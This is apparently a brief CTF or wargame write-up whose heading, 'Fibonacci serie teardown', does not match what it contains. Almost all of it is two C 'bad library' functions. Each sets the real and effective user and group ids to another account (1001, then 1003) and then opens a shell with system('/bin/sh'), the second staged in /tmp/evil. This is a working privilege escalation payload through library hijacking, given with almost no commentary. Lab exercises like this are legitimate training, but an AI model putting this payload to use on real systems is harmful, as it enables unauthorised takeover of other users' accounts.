---
title: Setuid, getuid...
description: Headache!
date: "2019-10-10T19:47:09+02:00"
thumbnail: "fibo1.png"
---
# Fibonacci serie teardown
```
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void better_printf(){

    printf("Real user id = %d, Effective User id = %d\n",getuid(),geteuid());

    setreuid(1001,1001);
    setgid(1001);

    printf("I'm the bad library\n");
    printf("Real user id = %d, Effective User id = %d\n",getuid(),geteuid());
    system("/bin/sh");
}


```
#level2

``` 
level2@sojack:/tmp/evil$ cat test2.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void better_printf(){

    printf("Real user id = %d, Effective User id = %d\n",getuid(),geteuid());

    setreuid(1003,1003);
    setgid(1003);

    printf("I'm the bad library\n");
    printf("Real user id = %d, Effective User id = %d\n",getuid(),geteuid());
    system("/bin/sh");
}

```
